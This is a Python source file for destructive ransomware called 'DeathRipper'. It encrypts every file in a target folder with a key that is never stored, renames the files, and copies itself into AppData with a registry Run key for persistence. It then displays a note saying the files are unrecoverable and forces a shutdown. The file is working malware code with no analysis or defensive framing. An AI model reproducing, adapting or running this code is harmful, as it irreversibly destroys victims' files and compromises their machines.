import os
import sys
import ctypes
import ctypes.wintypes
import psutil
import random
import string
import tkinter as tk
from tkinter import messagebox
from Crypto.Util import Counter
from Crypto.Cipher import AES
import base64
import getpass
import socket
import shutil
import subprocess
import threading

# Generate a random key
def generate_key():
    return bytes([random.randint(0, 255) for _ in range(32)])

# Encrypt a file
def encrypt_file(key, file_name):
    counter = Counter.new(128)
    c = AES.new(key, AES.MODE_CTR, counter=counter)
    with open(str(file_name), 'r+b') as f:
        plaintext = f.read(16)
        while plaintext:
            try:
                f.seek(-len(plaintext), 1)
                f.write(c.encrypt(plaintext))
                plaintext = f.read(16)
            except:
                pass
    try:
        os.rename(file_name, file_name + ".en")
    except:
        pass

# Create a persistence mechanism
def create_persistence():
    evil_file_location = os.environ["appdata"] + "\\Windower.exe"
    if not os.path.exists(evil_file_location):
        try:
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call(r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run  /v updater /t REG_SZ /d "' + evil_file_location + '"', shell=True)
        except:
            pass

def show_ransom_note():
    root = tk.Tk()
    root.title("DeathRipper Ransomware")
    label = tk.Label(root, text="**WARNING: YOUR FILES HAVE BEEN ENCRYPTED**\n. Now, all your precious files are encrypted and will be deleted forever if you don't... just kidding, there's no way to recover them. The key is burned, and you'll never see your files again.\n\n**YOU HAVE BEEN HACKED**\n\nDon't bother trying to find the decryption key, it's gone. Don't bother trying to restore your files, they're gone. You should have been more careful.\n\n**DEATHRIPPER WAS HERE**\n\nYour PC will shut down in 30 seconds.", wraplength=400, fg="red", bg="black")
    label.pack()
    root.geometry("500x400")
    threading.Thread(target=lambda: os.system('shutdown /s /t 30')).start()
    root.mainloop()

def get_ip_address():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip_address = s.getsockname()[0]
        s.close()
        return ip_address
    except:
        return "Unknown"

# Get the username of the victim
def get_username():
    return getpass.getuser()

class virus:
    def __init__(self):
        self.key = generate_key()
        self.target_dir = r"C:\Users\youss\OneDrive\Desktop\testing"
        for file in os.listdir(self.target_dir):
            file_path = os.path.join(self.target_dir, file)
            if os.path.isfile(file_path):
                try:
                    encrypt_file(self.key, file_path)
                except:
                    pass
        create_persistence()
        show_ransom_note()

if __name__ == "__main__":
    virus() 